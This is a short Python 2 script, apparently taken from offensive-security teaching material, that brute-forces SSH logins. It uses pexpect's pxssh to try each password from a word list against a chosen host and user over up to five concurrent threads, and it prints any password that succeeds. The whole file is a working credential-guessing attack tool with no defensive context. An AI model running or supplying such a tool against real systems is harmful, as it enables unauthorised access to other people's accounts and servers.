from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections  = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0

def connect(host,user,password,release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        print '[+] Password Found:'+password
        Found = True
    except Exception,e:
        if "read_nonblocking " in str(e):
            Fails += 1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        if release:
            connection_lock.release()
def main():
    parser = optparse.OptionParser("usage%prog "+ '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H',dest='tgtHost',type='string',help='specify trarget host')
    parser.add_option('-u',dest='user',type='string',help='specify trarget user')
    parser.add_option('-F',dest='passwdFile',type='string',help='specify trarget passwdFile')
    (options,args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile==None or user==None:
        print parser.usage
        exit(0)
    user = options.user
    fn = open(passwdFile,'r')
    user = options.user
    for line in fn.readlines():
        user = options.user
        if Found:
            print '[*] excting:password Found'
            exit(0)
        if Fails>5:
            print "[!] excting:Too many socket Timeouts"
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print '[-] Testing:'+str(password)
        t = Thread(target=connect,args=(host,user,password,True))
        child = t.start()
if __name__ =='__main__':
    main()
